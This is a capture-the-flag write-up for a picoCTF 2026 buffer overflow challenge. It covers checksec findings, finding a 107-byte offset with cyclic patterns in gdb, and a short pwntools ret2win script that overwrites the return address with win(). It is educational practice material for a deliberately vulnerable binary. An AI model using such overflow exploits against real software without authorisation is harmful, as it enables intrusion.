# PicoCTF 2026: Offset-Cycle

**Category:** Binary Exploitation  |
**Point:** 300 |
**Solve:** 1,091 

**Decription:** 
> It's a race against time. Solve the binary exploit ASAP.
Additional details will be available after launching your challenge instance.

## Connection
```bash
ssh -p <PORT> ctf-player@green-hill.picoctf.net
# Password: password
```
You need to access picoCTF 2026 to get port and password for this challenge!

## Write-up
### 1. Challenge Overview
The challenge provides a remote SSH environment, containing ```start``` file to create a C file and a binary file

* Time: 120s to solve before deleting automatically
* Target: Buffer Overflow to ```win()``` func to read flag

### 2. **C file Analysis**
After connected to server, we can run ```./start``` and read C file generated

<img width="953" height="954" alt="image" src="https://github.com/user-attachments/assets/de5d2876-7ba6-4703-b8db-ec5c19043350" />

Now, **C File**:
* define a random buffer in each session
* win() contains flag.txt
* vuln() uses gets - which do not count number of digits we input

=> This is a common Buffer Overflow vuln

### 3. **Binary Analysis**

<img width="605" height="233" alt="image" src="https://github.com/user-attachments/assets/759f90f6-85d0-477e-baa1-58aec78130a6" />

Using ```checksec```, we know:
* Architecture: i386
* No PIE
* No Canary

### 4. **Exploitation Strategy**
##### A. Finding offset
We know that Buffer was pushed 95 byte, so offset will be around 95-115 bytes due to stack alignment ( Buffer size divides by 16 ) + Saved EBP (4 bytes)
* ```pwn cyclic 150``` will help us 
* Run in gdb find error address and calculating offset by ```cyclic -l address``` (It creates non-repeated 4 digits like baaa, caaa,... then when process is terminated, cycle will find the marked digit and give the offset from that)
* 
<img width="949" height="68" alt="image" src="https://github.com/user-attachments/assets/1e111a3c-f29c-407f-88df-c5bdd927ff1d" />

<img width="940" height="408" alt="image" src="https://github.com/user-attachments/assets/a7c3ca2f-a4a5-4c36-9c8f-5e7397865ab6" />

-> 107 offset

##### B. Finding Target
Address to overwrite: ```win()```
* Using ```print win``` in gdb
-> ```0x80491f6```

### 5. **The Exploiting Script**
* Script:
```python
from pwn import *
p = process('./18')

payload = b'a'*107 + p32(0x80491f6)

p.sendline(payload) #sendline helps send last digits by /n (adapting to gets)
p.interactive()
```
* Executing:
  
  <img width="937" height="275" alt="image" src="https://github.com/user-attachments/assets/ed2cb107-5b06-4225-a315-d681b50422f4" />

Do it yourself and get your own flag
